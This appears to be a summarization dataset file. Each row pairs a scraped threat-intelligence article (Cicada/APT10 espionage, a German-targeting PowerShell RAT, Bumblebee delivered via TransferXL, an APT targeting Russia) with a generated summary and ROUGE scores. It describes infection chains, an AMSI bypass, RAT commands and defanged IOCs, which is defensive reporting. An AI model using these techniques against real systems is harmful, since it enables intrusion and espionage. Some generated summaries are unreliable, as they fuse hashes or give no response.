for malware delivery and/or propagation throughout their systems. Systems to assess include: Enterprise applications particularly those that have the capability to directly interface with and impact multiple hosts and endpoints. Common examples include: Patch management systems, Asset management systems, Remote assistance software (typically used by the corporate help desk), Antivirus (AV) software, Systems assigned to system and network administrative personnel, Centralized backup servers, and Centralized file shares. While not only applicable to malware, threat actors could compromise additional resources to impact the availability of critical data and applications. Common examples include: Centralized storage devices Potential risk direct access to partitions and data warehouses. Network devices Potential risk capability to inject false routes within the routing table, delete specific routes from the The ITSecurity report recommends ensuring that these systems are contained within restrictive Virtual Local Area Networks (VLANs), with additional segmentation and network access controls. Layered access control, and Devicelevel access control enforcement restricting access from only predefined VLANs and trusted IP ranges. Require multifactor authentication for interactive logons. Ensure that authorized users are mapped to a specific subset of enterprise personnel. If possible, the ""Everyone,"" ""Domain Users,"" or the ""Authenticated Users"" groups should not be permitted the capability to directly access or authenticate to these systems. Ensure that unique domain accounts are used and documented for each enterprise application service. Context of permissions assigned to these accounts should be fully documented and configured based upon the concept of least privilege. Provides an enterprise with the capability to track and monitor specific actions correlating to an application's assigned service account. If possible, do not grant a service account with local or interactive logon permissions. Service accounts should be explicitly denied permissions to access network shares and critical data locations. Continuously review centralized file share ACLs and assigned permissions. Restrict Write/Modify/Full Control permissions when possible. Monitoring Audit and review security logs for anomalous references to enterpriselevel administrative (privileged) and service accounts. Victims of a destructive malware attacks should immediately focus on containment to reduce the scope of affected systems. ### Output: Victims of a destructive malware attacks should immediately focus on containment to reduce the scope of affected systems. No response.";en;{'r': 0.2690513219284603, 'p': 0.9376693766937669, 'f': 0.4181268847525379};{'r': 0.20945945945945946, 'p': 0.8887015177065767, 'f': 0.3390157576076346};{'r': 0.2690513219284603, 'p': 0.9376693766937669, 'f': 0.4181268847525379}
http://prod-blogs-ui.client-b1.bkjdigital.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks;Cicada: Chinese APT Group Widens Targeting in Recent Espionage Activity;A Chinese state-backed advanced persistent threat (APT) group is attacking organizations around the globe in a likely espionage campaign that has been ongoing for several months.Victims in this Cicada (aka APT10) campaign include government, legal, religious, and non-governmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America. The wide number of sectors and geographies of the organizations targeted in this campaign is interesting. Cicada's initial activity several years ago was heavily focused on Japanese-linked companies, though in more recent times it has been linked to attacks on managed service providers (MSPs) with a more global footprint. However, this campaign does appear to indicate a further widening of Cicada's targeting.The attribution of this activity to Cicada is based on the presence on victim networks of a custom loader and custom malware that are believed to be exclusively used by the APT group.While Cicada has been linked to espionage-style operations dating back to 2009, the earliest activity in this current campaign occurred in mid-2021, with the most recent activity seen in February 2022, so this is a long-running attack campaign that may still be ongoing, researchers from Symantec, a division of Broadcom, have found.Activity on infected networksIn several cases, the initial activity on victim networks is seen on Microsoft Exchange Servers, suggesting the possibility that a known, unpatched vulnerability in Microsoft Exchange may have been used to gain access to victim networks in some cases.Once the attackers have successfully gained access to victim machines we observe them deploying various different tools, including a custom loader and the Sodamaster backdoor. The loader deployed in this campaign was also deployed in a previous Cicada attack.Sodamaster is a known Cicada tool that is believed to be exclusively used by this group. It is a fileless malware that is capable of multiple functions, including evading detection in a sandbox by checking for a registry key or delaying execution, enumerating the username, hostname, and operating system of targeted systems, searching for running processes, and downloading and executing additional payloads. It is also capable of obfuscating and encrypting traffic that it sends back to its command-and-control (C&C) server. It is a powerful backdoor that Cicada has been using since at least 2020.In this campaign, the attackers are also seen dumping credentials, including by using a custom Mimikatz loader. This version of Mimikatz drops mimilib.dll to obtain credentials in plain text for any user that is accessing the compromised host and provides persistence across reboots.The attackers also exploit the legitimate VLC Media Player by launching a custom loader via the VLC Exports function, and use the WinVNC tool for remote control of victim machines.Other tools utilized in this attack campaign include:RAR archiving tool - can be used to compress, encrypt, or archive files, likely for exfiltration.System/Network discovery - a way for attackers to determine what systems or services are connected to an infected machine.WMIExec - Microsoft command-line tool that can be used to execute commands on remote computers.NBTScan - an open-source tool that has been observed being used by APT groups to conduct internal reconnaissance within a compromised network.VictimsThe victims in this campaign appear to primarily be government-related institutions or NGOs, with some of these NGOs working in the fields of education and religion. There were also victims in the telecoms, legal, and pharmaceutical sectors.The victims are spread through a wide number of regions including the U.S., Canada, Hong Kong, Turkey, Israel, India, Montenegro, and Italy. There is also just one victim in Japan, which is notable due to Cicada's previous strong focus on Japanese-linked companies.The attackers spent as long as nine months on the networks of some victims.The victims targeted, the various tools deployed in this campaign, and what we know of Cicada's past activity all indicate that the most likely goal of this campaign is espionage. Cicada activity was linked by U.S. government officials to the Chinese government in 2018.Significance of this activityThis is a long-running campaign from a sophisticated and experienced nation-state-backed actor that may still be ongoing, as the most recent activity we saw in this campaign was in February 2022. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups, and shows that Cicada still has a lot of firepower behind it when it comes to its cyber activities.ProtectionFor the latest protection updates, please visit the Symantec Protection Bulletin.Indicators of Compromise (IOCs)If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file.01b610e8ffcb8fd85f2d682b8a364cad2033c8104014df83988bc3ddfac8e6ec056c0628be2435f2b2031b3287726eac38c94d1e7f7aa986969baa09468043b1062ce400f522f90909ed5c4783c5e9c60b63c09272e2ddde3d13e748a528fa880b452f7051a74a1d4a544c0004b121635c15f80122dc6be54db660ceb2264d6f0ec48b297dd1b0d6c3ddd15ab63f405191d7a849049feedfa7e44096c6f9d42a20fc3cf1afcad9e6f19e9abebfc9daf374909801d874c3d276b913f12d6230ec2317d3e14ab214f06ae38a729524646971e21b398eda15cc9deb8b00b231abc32417da3adebd446b9fcb8b896adb14ea495a4d923e3655e5033f78d8e648fcc837f56127226ce96af501c8d805e76156ca6b87da1ba1bb5d227100912f6c52d93aa54e7d99b69a81c8b25ab57aeb971644ed0a206743c9e51a80ec1852f036633ff2d6954a6b62afb7499e1e317af64502570181fd49ac5a74e2f7947e2e89db4f6a768841595293146ca04f879efa988e4e95ce0f2bc299cb669fea55e78b655269db6b19a1d758c75e58ee9bbf2f8fd684cfedbfe712d5b0182d7bbd3a16905bc68df582c86c884b563b15057cc223f2e9bc1022ebb297e32a9a7e3036228b6b4692029f05489ecda10e11cfacfc3b19097856b88647d3695f3bdc7dd83ce97b581c0305c78f28bad60028c63e852dc34fc9e28f39e4b0af73d80c1d9680c983030f299a776114878bcd2ade585d97836ef4ddb6943cb796be2c88bcb83a8390a03dabfc4e56a12cc3bac5cbe991db044b900a01ec341803c864506e467ffa9917a2213f114e87745867e5fea6717efd727d7c08fdc851969224be2f0e019b9b5f9ff82ed238bcbd83628ed3ec84988dc05f81cec9e45a512fbd2c8ac45c33adfe177ade7d9bfe4df251a69678102aec1104a4ba9f73032dd90aba76d8bdd9b76fde584f87c88bdd21fab613335ce7fc05788aa4bb3191d1517ec16ef4d11ace45af43dd2af52d6034e981515474147802efdfe036e00078fee29a01694fd6d461347388ccf0c2008332a1674885a41f70b94b2263bddef44e796d3b1b43b5df993dca434c3cd2da94b6a90b0ae1650d9c95ea1d5f6a5267aca640d8c6d00eee46e714660f7652502d5b3633fae0c08c8018f51cfb56a487afd58d04dd551afe33fdd5a63fee62362c9db329dde11080a0152e513ef0e6f680286a6a7b243f88[.]198.101[.]58168[.]100.8[.]38;The ITSecurity report summarizes that a Chinese statebacked advanced persistent threat (APT) group is attacking organizations around the globe in a likely espionage campaign that has been ongoing for several months. Victims in this Cicada (aka APT10) campaign include government, legal, religious, and nongovernmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America. The wide number of sectors and geographies of the organizations targeted in this campaign is interesting. Cicada's initial activity several years ago was heavily focused on Japaneselinked companies, though in more recent times it has been linked to attacks on managed service providers (MSPs) with a more global footprint. However, this campaign does appear to indicate a further widening of Cicada's targeting. The attribution of this activity to Cicada is based on the presence on victim networks of a custom loader and custom malware that are believed to be exclusively used by the APT group. While Cicada has been linked to espionagestyle operations dating back to 2009, the earliest activity in this current campaign occurred in mid2021, with the most recent activity seen in February 2022, so this is a longrunning attack campaign that may still be ongoing, researchers from Symantec, a division of Broadcom, have found. Activity on infected networks In several cases, the initial activity on victim networks is seen on Microsoft Exchange Servers, suggesting the possibility that a known, unpatched vulnerability in Microsoft Exchange may have been used to gain access to victim networks in some cases. Once the attackers have successfully gained access to victim machines we observe them deploying various different tools, including a custom loader and the Sodamaster backdoor. The loader deployed in this campaign;en;{'r': 0.3974025974025974, 'p': 0.9444444444444444, 'f': 0.55941498669024};{'r': 0.3429811866859624, 'p': 0.9221789883268483, 'f': 0.49999999604793127};{'r': 0.3974025974025974, 'p': 0.9444444444444444, 'f': 0.55941498669024}
https://www.malwarebytes.com/blog/threat-intelligence/2022/05/custom-powershell-rat-targets-germans-seeking-information-about-the-ukraine-crisis;Custom PowerShell RAT targets Germans seeking information about the Ukraine crisis;"Posted: May 16, 2022 byMalwarebytes Threat Intelligence has uncovered an attack using the lure of information about the war in Ukraine to target people in Germany.This blog post was authored by Hossein Jazi and Jerome SeguraPopulations around the world--and in Europe in particular--are following the crisis in Ukraine very closely, and with events unfolding on a daily basis, people are hungry for information.Although all countries have reasons to be concerned, the situation is Germany is more complicated than most. It is one of the few European countries to have received criticism for its attitude to the Ukraine-Russia conflict, as it struggles to end its reliance on Russian energy, and Moscow recently imposed sanctions on Gazprom Germania, further increasing economic tensions.This week our analysts discovered a new campaign that plays on these concerns by trying to lure Germans with a promise of updates on the current threat situation in Ukraine. The downloaded document is in fact decoy for a Remote Access Trojan (RAT) capable of stealing data and executing other malicious commands on a victim's computer.Decoy site lures victims with Ukraine situationThreat actors registered an expired German domain name at collaboration-bw[.]de that was formally used as a collaboration platform to develop new ideas for the Baden-Wurttemberg state.Threat actors registered an expired domain associated with Baden-WurttembergThe threat actors used the domain to host a website that looked like the official Baden-Wurttemberg website, baden-wuerttemberg.de.A comparison of the real baden-wuerttemberg.de (top) and the malicious fake (bottom)With this copycat, the attackers created the perfect placeholder for the lure they wanted their victims to download: A file tantalising called 2022-Q2-Bedrohungslage-Ukraine (threat situation in Ukraine for Q2), offered via a prominent blue download button.The website promises important information and tips about the Ukraine crisisAn English translation of the page reads:Important, current threat situation regarding the Ukraine crisisOn this website you will always find the most important information and tips for dealing with the current threat posed by the Ukraine crisis. Please download the document now and read through the current information. The document is constantly updated and is up to date. Our suggested tips can be practically implemented in everyday work and you should already implement them today. Thanks for your support.File analysisThe archive file called 2022-Q2-Bedrohungslage-Ukraine contains a file named 2022-Q2-Bedrohungslage-Ukraine.chm . The CHM format is Microsoft's HTML help file format, which consists of a number of compiled HTML files.The CHM file displays a fake error messageVictims will get a fake error message when they open up that file, while PowerShell quietly runs a Base64 command.PowerShell executes a Base64-encoded commandAfter de-obfuscating the command we can see it is designed to execute a script downloaded from the fake Baden-Wurttemberg website, using Invoke-Expression (IEX).The PowerShell code fetches and executes a malicious scriptThe malicious script downloaded from the fake Baden-Wurttemberg websiteThe downloaded script creates a folder called SecuriyHealthService in the current user directory and drops two files into it: MonitorHealth.cmd and a script called Status.txt . The .cmd file is very simple and just executes Status.txt through PowerShell.Finally, the downloaded script makes MonitorHealth.cmd persistent by creating a scheduled task that will execute it each day at a specific time.PowerShell RAT (Status.txt)Status.txt is a RAT written in PowerShell (This Rat is a modified version of an HTTP Reverse Shell that is available on Github). It starts its activities by collecting some information about the victim's computer, such as the current username and working directory, and the computer's hostname. It also builds a unique id for the victim, the clientid .This data is exfiltrated as a JSON data structure sent to the server via a POST request:$json='{ ""type"": ""newclient"", ""result"": """", ""pwd"": ""' + $pwd_b64 + '"", ""cuser"": ""' + $cuser + '"", ""hostname"": ""' + $hname + '"", ""clientid"": ""' + $clientid + '""}',$headers=@{'X-Request-ID'=$strhash}However, before executing this requests the script will first bypass the Windows Antimalware Scan Interface (AMSI) using an AES-encrypted function called bypass . It is decrypted using a generated key and IV before execution.The bypass function that contains the encrypted script to bypass AMSI.The content of the AMSI bypass script after decryptionThis RAT has the following capabilities:Download (type: D0WNl04D): Download files from server(type: D0WNl04D): Download files from server Upload (type: UPL04D): Upload file to the server(type: UPL04D): Upload file to the server LoadPS1 (type: L04DPS1): Load and execute a PowerShell script(type: L04DPS1): Load and execute a PowerShell script Command(type: C0MM4ND): Execute a specific commandGerman command and control serverThe attack was thoughtfully carried out--even ensuring that the stolen data was sent to a German domain name, kleinm[.]de, to avoid suspicion.It is not easy to attribute this activity to a specific actor, and there are no solid indicators to support attribution. Based on motivation alone, we hypothesise that a Russian threat actor could be targeting German users, but without clear connections in infrastructure or similarities to known TTPs, such attribution is weak.The Malwarebytes Threat Intelligence team continues to monitor attacks taking advantage of the warin Ukraine while ensuring our customers are protected.Indicators of Compromise (IOCs)Phishing sitecollaboration-bw[.]de/bedrohung-ukr.htmlLure2022-Q2-Bedrohungslage-Ukraine.zip2430f68285120686233569e51e2147914dc87f82c7dbdf07fe0c34dbb1aca77c2022-Q2-Bedrohungslage-Ukraine.chm80bad7e0d5a5d2782674bb8334dcca03534aa831c37aebb5962da1cd1bec4130Status.txta5d8beaa832832576ca97809be4eee9441eb6907752a7e1f9a390b29bbb9fe1fMonitorHealth.cmdfc71522a4125ca4bdc5e5deca4a6498e7f2da4408614c2e1284c3ae8c083a5fdC2kleinm[.]deMITRE ATT&CK";The PowerShell code fetches and executes a malicious script downloaded from the fake BadenWurttemberg website. The malicious script creates a folder called SecurityHealthService in the current user directory and drops two files into it: MonitorHealth.cmd and a script called Status.txt. The Malwarebytes Threat Intelligence team continues to monitor attacks taking advantage of the warin Ukraine while ensuring our customers are protected.Indicators of Compromise (IOCs)Phishing sitecollaborationbw[.]de/bedrohungukr.htmlLure2022Q2BedrohungslageUkraine.zip2430f68285120686233569e51e2147914dc87f82c7dbdf07fe0c34dbb1aca77c2022Q2BedrohungslageUkraine.chm80bad7e0d5a5d2782674bb8334dcca03534aa831c37aebb5962da1cd1bec4130Status.txta5d8beaa832832576ca4bdc5e5deca4a6498e7f2da4408614c2e1284c3ae8c083a5fdC2kleinm[. ]deMITRE ATT&CK;en;{'r': 0.12249443207126949, 'p': 0.8870967741935484, 'f': 0.21526418573473605};{'r': 0.07692307692307693, 'p': 0.821917808219178, 'f': 0.14067995154155602};{'r': 0.12249443207126949, 'p': 0.8870967741935484, 'f': 0.21526418573473605}
https://isc.sans.edu/diary.html?storyid=0;InfoSec Handlers Diary Blog;IntroductionLast month, Google's Threat Analysis Group (TAG) reported on EXOTIC LILY using file transfer services like TransferNow, TransferXL, WeTransfer, or OneDrive to distribute malware (link). Threat researchers like @k3dg3 occasionally report malware samples from this activity. Based on @k3dg3's recent tweet, I searched through VirusTotal and found a handful of active TransferXL URLs delivering ISO files for Bumblebee malware.Today's diary reviews an infection generated from this activity on Wednesday 2022-05-18.Shown above: Flow chart for infection discussed in this diary.TransferXL URLsTransferXL is a legitimate file sharing service. However, like other services with a cost-free tier, TransferXL has been abused by criminals as a way to distribute malicious files. However, with TransferXL, we have the benefit of seeing an email address used to share the malicious file. The image below shows a malicious TransferXL URL recently submitted to VirusTotal. Viewed in a web browser, it sends a malicious file. The associated email address is jhurris@wolsleyindustrialgroup.com.Shown above: Malicious TransferXL URL delivering malware.The downloaded zip archive contains an ISO disk image. When double-clicked, this file is mounted as a DVD drive. The ISO file contains a visible Windows shortcut and a hidden malware DLL for Bumblebee. Double-clicking the Windows shortcut will run the hidden malware DLL on a vulnerable Windows host.Shown above: Downloaded ISO file mounted as a disk image containing Windows shortcut and hidden malware DLL.Traffic from an infectionAfter downloading malware from the malicious TransferXL URL, the infected host generated Bumblebee C2 traffic to 194.135.33[.]144 over TCP port 443.Shown above: Initial infection activity with Bumblebee C2 traffic filtered in Wireshark.Approximately 15 minutes after the Bumblebee C2 traffic first appeared, the infected Windows host generated HTTPS traffic to ec2-3-144-143-232-us-east-2.compute.amazonaws[.]com on 3.144.143[.]242 over TCP port 443. The infected host sent approximately 5.5 MB of data out and received approximately 4.0 MB of data back from that server.Shown above: Encrypted (HTTPS) traffic to an amazonAWS server.Approximately 14 minutes after HTTPS traffic to the amazonAWS server, HTTPS Cobalt Strike traffic appeared on 23.106.215[.]123 over TCP port 443 using xenilik[.]com as the domain. It lasted approximately 3 minutes.Shown above: Traffic from the infection showing Cobalt Strike activity.Indicators of Compromise (IOCs)TransferXL URLs associated with the above email returning zip archives containing malicious ISO files.hxxps://www.transferxl[.]com/download/00ZNPDZqZwZ9mhxxps://www.transferxl[.]com/download/00jwbtRXtsSsZXhxxps://www.transferxl[.]com/download/00vJV4K6QVXSq6hxxps://www.transferxl[.]com/download/00y12VGg75h7Khxxps://www.transferxl[.]com/download/08j8ZRjHFkVxxcNOTE: The above URLs usually have ?utm_source=downloadmail&utm_medium=e-mail appended to them.Email addresses associated with malicious TransferXL URLs:andresbolivar@southerncompanygas[.]cojhurris@wolsleyindustrialgroup[.]comm.jones@wolsleyindustrialgroup[.]commjones@wolsleyindustrialgroup[.]coDomains from the above emails:southerncompanygas[.]co - registered 2022-04-27- registered 2022-04-27 wolsleyindustrialgroup[.]com - registered 2022-04-29- registered 2022-04-29 wolsleyindustrialgroup[.]co - not registeredMalware from an infected Windows host:SHA256 hash: 1ec8c7e21090fb4c667f40c8720388a89789c569169fe0e41ec81567df499aacFile size: 669,897 bytesFile name: TransferXL-00jdMwft3vVZ7Q.zipFile description: Zip archive retrieved from TransferXL URLSHA256 hash: 24aa82e1a085412686af5d178810fc0d056c5b8167ae5b88973b33071aa14569File size: 1,052,672 bytesFile name: documents-2205210.isoFile description: ISO file extracted from downloaded zip archiveSHA256 hash: ade875616534b755f33f6012ea263da808dd7eb50bc903fc97722f37fac7c164File size: 1,191 bytesFile name: New Folder.lnkFile description: Windows shortcut contained in ISO fileShortcut: C:\Windows\System32\rundll32.exe spc.dll,JQhnMKwhpASHA256 hash: 88c07354f1d7b0485452d5c39dc1a6d73884e163bc5489c40adc6662602b4d76File size: 997,888 bytesFile name: spc.dllFile description: 64-bit DLL (hidden flag set) for Bumblebee malwareRun method: rundll32.exe [filename] ,JQhnMKwhpATraffic from the infected Windows host:194.135.33[.]144 port 443 - Bumblebee C2 HTTPS traffic3.144.143[.]242 port 443 - ec2-3-144-143-242.us-east-2.compute.amazonaws[.]com - HTTPS traffic- HTTPS traffic 23.106.215[.]123 port 443 - xenilik[.]com - Cobalt Strike HTTPS trafficFinal wordsAs the Google TAG blog post notes, EXOTIC LILY is using this method to push Bumblebee malware, and Bumblebee leads to further malware like Cobalt Strike. And Cobalt Strike has been documented by different sources as leading to ransomware.Today's diary reviewed a Bumblebee malware infection associated with EXOTIC LILY that led to Cobalt Strike activity.Pcap and malware samples associated with this infection are available here.---Brad Duncanbrad [at] malware-traffic-analysis.net;A malicious TransferXL URL was recently submitted to VirusTotal. The associated email address is jhurris@wolsleyindustrialgroup.com. The downloaded zip archive contains an ISO disk image. When doubleclicked, this file is mounted as a DVD drive. The ISO file contains a visible Windows shortcut and a hidden malware DLL for Bumblebee. After downloading malware from the malicious TransferXL URL, the infected host generated Bumblebee C2 traffic to 194.135.33[. ]144 over TCP port 443. Approximately 15 minutes after the Bumblebee C2 traffic first appeared, the infected Windows host generated HTTPS traffic to ec23144143232useast2.compute.amazonaws[. ]com on 3.144.143[. ]242 over TCP port 443. The infected host sent approximately 5.5 MB of data out and received approximately 4.0 MB of data back from that server. Approximately 14 minutes after HTTPS traffic to the amazonAWS server, HTTPS Cobalt Strike traffic appeared on 23.106.215[. ]123 over TCP port 443 using xenilik[. Brad Duncan,;en;{'r': 0.3127035830618892, 'p': 0.9320388349514563, 'f': 0.468292679164664};{'r': 0.22820037105751392, 'p': 0.8978102189781022, 'f': 0.3639053222119762};{'r': 0.3127035830618892, 'p': 0.9320388349514563, 'f': 0.468292679164664}
https://www.malwarebytes.com/blog/threat-intelligence/2022/05/unknown-apt-group-has-targeted-russia-repeatedly-since-ukraine-invasion;Unknown APT group has targeted Russia repeatedly since Ukraine invasion;"Posted: May 24, 2022 byAn in-depth look at the attack chain used by an unknown APT group that has launched four campaigns against Russian targets since February.An unknown Advanced Persistent Threat (APT) group has targeted Russian government entities with at least four separate spear phishing campaigns since late February, 2022.The campaigns, discovered by the Malwarebytes Threat Intelligence team, are designed to implant a Remote Access Trojan (RAT) that can be used to surveil the computers it infects, and run commands on them remotely. The malware uses a number of advanced tricks to hide what it does and how it works, but our analysts have been able to reverse engineer the malware, reveal its inner workings, and uncover some clues about its possible origins.Attribution is always difficult, and there is no shortage of countries or agencies with an interest in getting covert access to Russian government computers--and the recent invasion of Ukraine has simply increased the stakes. Although our analysis and attribution efforts are ongoing, we have discovered some indicators that suggest the threat actor may be a Chinese group.The campaignsThe APT group has launched at least four campaigns since late February, using a variety of lures, detailed below.1. Interactive map of UkraineThe threat actor started this campaign around February 26, 2022, and distributed its custom malware with the name interactive_map_UA.exe , trying to disguise it as an interactive map of Ukraine. This campaign began a few days after Russia invaded Ukraine, which shows the threat actor was monitoring the situation between Ukraine and Russia and took advantage of it to lure targets in Russia.2. Log4j patchIn this campaign the threat actor packaged its custom malware in a tar file called Patch_Log4j.tar.gz , a fake fix for December's high-profile Log4j vulnerability.This campaign ran in early March and was primarily aimed at RT TV (formerly Russia Today or Rossiya Segodnya, a Russian state-controlled international television network funded by the Russian government). The APT group had access to almost 100 RT TV employees' email address.The emails were sent with the subject ""??????. ??? ??. ????????????. ??????? ??????????? ???????????"", which translates into ""Rostec. FSB RF. Roskomnadzor. Urgent Vulnerability Fixes"". (Rostecis a Russian state-owned defense conglomerate founded by Putin.)The emails also come with a number of image files and a PDF attached, perhaps to make the email less suspicious, and to bypass any systems that flag emails by number of attachments.A spear phishing email from an unknown APT group claims to have ""urgent vulnerability fixes""The PDF attachment-- ? ????????????????? 3. 1.2022.pdf--pretends to be from the ""Ministry of Digital Development, Telecommunications and Mass Communications of the Russian Federation"". It contains instructions about how to execute the fake patch, as well as a bulleted list of security advice such as ""Use two-factor authentication"", ""Issue separate credit cards for purchases"", and ""Use Kaspersky antivirus"".A PDF attachment tries to build trust with security advice and instructions on how to run the fake Log4j patchIn a confident demonstration of just how little attention people pay to such lists it ends ""Do not open or reply to suspicious emails.""The list even includes a link to a page on VirusTotalthat proclaims in bright green letters that ""No security vendors and no sandboxes flagged this file as malicious"". This is just another effort to convince the victims that the attachment is not malicious--the file on VirusTotal has nothing to do with the attachment and appears to be a legitimate OpenVPN file.The PDF attachment links to a VirusTotal entry for an unrelated fileIn another effort to build trust, the spear phishing email links to the website rostec.digital , a domain registered by the threat actor, hosting a site made look like the official Rostec website.This email also contains links to fake Instagram and Facebook accounts. Interestingly, the threat actor created the Facebook page in June 2021, nine months before it was used in this campaign. This was probably an attempt to attract followers, to make the page look more legitimate, and it suggests the APT group were planning this campaign long before the invasion of Ukraine.The rostec.digital websiteThe rostec.digital facebook accountThe rostec.digital Instagram account3. Build RostecThe Rostec defense conglomerate also appears in the third campaign. This time the threat actor used the file name build_rosteh4.exe for its malware--an apparent attempt to make it look like software from Rostec.4. Saudi Aramco jobThe most recent campaign occured in mid April and used a Word document containing a fake job advert for a ""Strategy and Growth Analyst"" position at Saudi Aramcoas a lure.(We also discovered a self-extracting archive file that belonged to this campaign--the archive file used a Jitsi video conferencing software icon as decoy, and created a directory named Aramco under C:\ProgramData .)Although the job advert is written in English, it also contains a message in Russian, asking users to enable macros.A malicious job advert urges Russian readers to enable macrosThe document uses remote template injectionto download a macro-embedded template, which executes a macro that drops a VBS script called HelpCenterUpdater.vbs in the %USER%\Documents\AdobeHelpCenter directory.The template also seems to do a redundant check for the existence of %USER%\Documents\D5yrqBxW.txt and only if it doesn't exist, will it drop the script and execute it.Macros embedded in the remote templateThe obfuscated HelpCenterUpdater.vbs script drops another obfuscated VBS file named UpdateRunner.vbs and downloads the main payload--a DLL named GE40BRmRLP.dll --from its command and control (C2) server. (Interestingly, some anti-analysis code, and code responsible for persistence, seems to be commented out in UpdateRunner.vbs and isn't executed. )In another payload related to this campaign, the script seems to drop an EXE instead of a DLL, but after analyzing both it seems they share the same code.Deobfuscated HelpCenterUpdater.vbsT he job of the UpdateRunner.vbs script is to execute the DLL through rundll32.exe .Deobfuscated UpdateRunner.vbsThe malicious DLL contains the code that communicates with the C2 server and executes the commands it receives from it.The attack chain for the Saudi Aramco-themed APT campaignThe malware, which is common to all four campaigns, is explained in detail in the next section.Payload analysisThis analysis focuses on the GE40BRmRLP.dll payload from the Saudi Aramco campaign, but the malware used in all four campaigns is essentially the same, with small differences in the code.The DLL is heavily obfuscated and most of the library functions are statically linked. IDA is barely able to recognize any functions, though it was able to recognize a few that indicate the DLL was most likely compiled with LLVM. The DLL's original name is supposed to be simpleloader.dll , as we can see after analyzing it a bit.The DLLMain function from GE40BRmRLP.dllBefore we dive into the functionality and capabilities of this malware, let's look at various methods it uses to make the analysis difficult for us.Anti-analysis techniquesControl Flow FlatteningAll of the samples used in these campaigns use control flow flattening heavily, a technique that flattens the nested structure of a program, making analysis very difficult. We used the D810plugin for IDA which has the capability to deobfuscate flattened code and make the decompilation more readable.Although there are many tools that can perform control flow flattening, in this case we suspect OLLVM--an obfuscator for LLVM--was used. The different samples had different levels of flattening and OLLVM allows users to specify this. Additionally we also saw what looks like the Bogus Control FlowLLVM pass being used.Control Flow Flattening used by the malwareString obfuscationThe payload's strings are obfuscated with simple XOR encoding. The decode_string function which is used to decode a string takes 3 arguments: The encoded string, the destination of the decoded string, and the byte that is used while decoding the string.Each string is decoded every time it's required by the malware.The decode_string function from GE40BRmRLP.dllCommand and controlBefore contacting its C2 server the malware derives an ID which is unique to every machine, which could be used to differentiate infections. It uses the data from the following APIs to construct the ID:GetFileAttributesA on the C:\Windows directoryon the directory GetComputerNameAGetVolumeInformationA on the C:\ driveIt then calculates a hash of this data using the Blake2b-256 algorithm and sends it when it makes the first contact with its C2.Deriving the IDThe C2 address is decoded every time the malware sends a request. To communicate with the C2 the malware uses GET requests in the form url/?wSR=data , where datacontains the encoded information.Interestingly Any.run and Fiddler fail to capture the HTTPS requests made by the malware. To make them, the malware doesn't use any library functions but instead implements everything over raw sockets, and it uses the WolfSSLlibrary to implement SSL itself. Our analysis also uncovered traces of http-parserfrom ZephyrOS. The certificate used for the SSL communication is stored inside the binary as chunks of encoded strings. Initially the malware decodes this data and stores it. Later, while making the HTTPS request, it loads this data using WolfSSL's loadX509orX509REQFromBuffer.After making every request the malware sleeps for a random amount of time.HTTPS GET requestBased on the response to the above request, the malware decides which of command to execute:getcomputername . This retrieves the computer name using GetComputerNameA and sends a response to the C2 containing the unique id and the computer name. upload . This receives a file name and file contents from the C2 which it writes to the local file system. execute . This receives a command line instruction from the C2 and executes it using CreateProcessA . If the command is successful then the malware sends the UID with the ""OK"" string to the C2, or the output of GetLastError if it fails. exit . This is used to terminate the malware process. ls . This command uses a directory name from the C2, or the name of the current directory if one isn't provided. It uses the FindFirstFile and FindNextFile function to retrieve a list of all the files under the directory and sends it back to the C2.The upload commandThe List Files commandAttributionAttribution is difficult, and threat actors are known to use indicators from other groups as false flags. The attribution of the APT behind these campaigns is ongoing, but based on the infrastructure used we assess with low confidence that this group is a Chinese actor.All of the C2s are from BL Networks, which has been used by Chinese APTsin the past. Also, we discovered infrastructure overlap between the malware we analyzed and the Sakula Rat malware used by the Deep PandaAPT.Infrastructure overlap between Sakula RAT and the malware analyzed in this articleAnother interesting indicator we found was that the macro used in the Aramco campaign is almost identical to some macros used by TrickBot and BazarLoader in the past. We think the actor may have used the same macro builder to generate its macro, and they may have used it as a false flag. There are some other weak indicators, such as WolfSSL, which has been used by Lazarus and Tropic Troopers, but they are not enough to help attribute the attack to any specific actor.Malwarebytes customers were proactively protected against these campaigns thanks to our heuristic detection engines.IOCsC2 Domainswindowsipdate[.]commicrosftupdetes[.]commirror-exchange[.]comC2 IPs168.100.11.142192.153.57.8345.61.137.211206.188.197.35Download Domainfatobara[.]comDownload IP91.210.104.54Hashes";"The APT group has launched at least four campaigns since late February, using a variety of lures, detailed below. 1. Interactive map of Ukraine The threat actor started this campaign around February 26, 2022, and distributed its custom malware with the name interactive_map_UA.exe , trying to disguise it as an interactive map of Ukraine. This campaign began a few days after Russia invaded Ukraine, which shows the threat actor was monitoring the situation between Ukraine and Russia and took advantage of it to lure targets in Russia. 2. Log4j patch In this campaign the threat actor packaged its custom malware in a tar file called Patch_Log4j.tar.gz , a fake fix for December's highprofile Log4j vulnerability. This campaign ran in early March and was primarily aimed at RT TV (formerly Russia Today or Rossiya Segodnya, a Russian statecontrolled international television network funded by the Russian government). The APT group had access to almost 100 RT TV employees' email address. The emails were sent with the subject ""??????. ??? ??. ????????????. ??????? ??????????? ??????????? "", which translates into ""Rostec. FSB RF. Roskomnadzor. Urgent Vulnerability Fixes"". Rostec is a Russian stateowned defense conglomerate founded by Putin. The threat actor used the file name build_rosteh4.exe for its malwarean apparent attempt to make it look like software from Rostec. HTTPS GET requestBased on the response to the above request, the malware decides which of command to execute:getcomputername . This retrieves the computer name using GetComput";en;{'r': 0.18803418803418803, 'p': 0.9506172839506173, 'f': 0.31396533873093363};{'r': 0.12560975609756098, 'p': 0.911504424778761, 'f': 0.22079313827837002};{'r': 0.18803418803418803, 'p': 0.9506172839506173, 'f': 0.31396533873093363}
